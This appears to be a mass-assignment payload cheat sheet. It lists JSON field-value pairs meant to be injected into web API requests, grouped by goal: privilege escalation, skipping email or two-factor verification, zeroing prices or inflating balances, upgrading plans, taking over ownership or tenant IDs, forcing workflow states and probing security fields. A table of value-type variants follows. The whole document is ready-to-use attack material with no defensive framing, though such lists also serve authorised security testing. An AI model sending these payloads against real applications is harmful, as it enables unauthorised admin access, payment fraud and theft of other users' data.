# Payload variants — the field-value pairs per semantic

## Privilege semantic

```json
{"role":"admin"}        {"role":"superuser"}      {"role":"moderator"}
{"role":"operator"}     {"is_admin":true}         {"isAdmin":true}
{"admin":true}          {"superuser":true}        {"is_staff":true}
{"isStaff":true}        {"moderator":true}        {"internal":true}
{"debug":true}          {"developer":true}        {"permissions":["*"]}
{"permissions":["admin"]}  {"scopes":["admin","write"]}
{"groups":["admin"]}    {"groups":[{"id":1}]}     {"groups":[{"name":"admin"}]}
{"roles":["admin"]}     {"role_ids":[1]}          {"access_level":9}
{"accessLevel":9}       {"clearance":"top"}       {"tier":"admin"}
{"privileges":["all"]}  {"authorities":["ROLE_ADMIN"]}
{"can_admin":true}      {"god":true}              {"root":true}
{"su":true}             {"is_poweruser":true}     {"user_type":"admin"}
{"type":"admin"}        {"_t":"AdminUser"}        {"__t":"Admin"}
```

## Verification / state semantic

```json
{"verified":true}       {"is_verified":true}      {"isVerified":true}
{"email_verified":true} {"emailVerified":true}    {"email_verified_at":"2024-01-01"}
{"phone_verified":true} {"activated":true}        {"is_active":true}
{"isActive":true}       {"active":true}           {"enabled":true}
{"approved":true}       {"is_approved":true}      {"isApproved":true}
{"confirmed":true}      {"is_confirmed":true}     {"status":"active"}
{"status":"approved"}   {"onboarding_complete":true}
{"mfa_enabled":false}   {"mfaEnabled":false}      {"otp_required":false}
{"passwordless":true}   {"skip_verification":true}
{"bypass_2fa":true}     {"trusted":true}          {"trust_level":9}
```

## Economic semantic

```json
{"balance":999999}      {"balance":1e6}           {"credits":999999}
{"wallet":999999}       {"coins":999999}          {"points":999999}
{"tokens":999999}       {"score":999999}          {"xp":999999}
{"price":0}             {"price":0.01}            {"cost":0}
{"amount":0}            {"total":0}               {"subtotal":0}
{"discount":100}        {"discount_percent":100}  {"coupon":"FREE100"}
{"free_shipping":true}  {"freeShipping":true}     {"price_override":0}
{"unit_price":0}        {"salary":999999}         {"credit_limit":1e9}
{"paid":true}           {"is_paid":true}          {"invoice_paid":true}
{"payment_verified":true}  {"currency":"XXX"}
{"tax":0}               {"shipping":0}
```

## Plan / entitlement semantic

```json
{"plan":"enterprise"}   {"plan_id":5}             {"tier":"pro"}
{"subscription":"pro"}  {"subscription_type":"lifetime"}
{"subscriptionTier":"enterprise"}  {"seats":999}  {"quota":1e9}
{"rate_limit":0}        {"limits":{"requests":-1}}
{"features":["premium","admin"]}   {"entitlements":["*"]}
{"package":"enterprise"} {"pro":true}             {"premium":true}
{"lifetime":true}       {"vip":true}              {"founder":true}
```

## Ownership / tenancy semantic

```json
{"owner_id":1}          {"ownerId":1}             {"owner":1}
{"user_id":1}           {"userId":1}              {"account_id":1}
{"created_by":1}        {"createdBy":1}           {"author_id":1}
{"authorId":1}          {"tenant_id":1}           {"tenantId":1}
{"org_id":1}            {"orgId":1}               {"organization":1}
{"company_id":1}        {"team_id":1}             {"workspace_id":1}
{"parent_id":1}         {"project_id":1}
```

## Workflow / status semantic

```json
{"status":"shipped"}    {"status":"completed"}    {"status":"approved"}
{"status":"resolved"}   {"state":"done"}          {"phase":"final"}
{"current_step":99}     {"step":"complete"}       {"order_status":"shipped"}
{"payment_status":"paid"}  {"shipping_status":"delivered"}
{"review_status":"approved"} {"moderation_status":"approved"}
{"flagged":false}       {"archived":false}        {"deleted":false}
{"is_deleted":false}    {"locked":false}          {"frozen":false}
{"suspended":false}     {"banned":false}
```

## Security internals (probe carefully — wrong values break the object)

```json
{"password_hash":"$2b$..."}   {"api_key":"k"}     {"token":"t"}
{"secret":"s"}            {"private_key":"k"}     {"signing_key":"k"}
{"internal_note":"x"}     {"admin_note":"x"}      {"debug":true}
{"verbose":true}          {"dev":true}            {"test_mode":true}
{"is_system":true}        {"system":true}         {"service_account":true}
{"bot":true}              {"automation":true}
```

## Value-shape variants per field

| Field | String | Bool | Int | Array | Object |
|---|---|---|---|---|---|
| role | `"admin"` | — | `1` (enum) | `["admin"]` | `{"name":"admin"}` |
| is_admin | `"true"` | `true` | `1` | — | — |
| groups | `"admin"` | — | — | `["admin"]` | `[{"id":1}]` |
| verified | `"yes"`/`"1"` | `true` | `1` | — | — |
| balance | `"9999"` | — | `9999` | — | — |
| plan | `"pro"` | — | `5` (plan_id) | `["pro"]` | `{"type":"pro"}` |
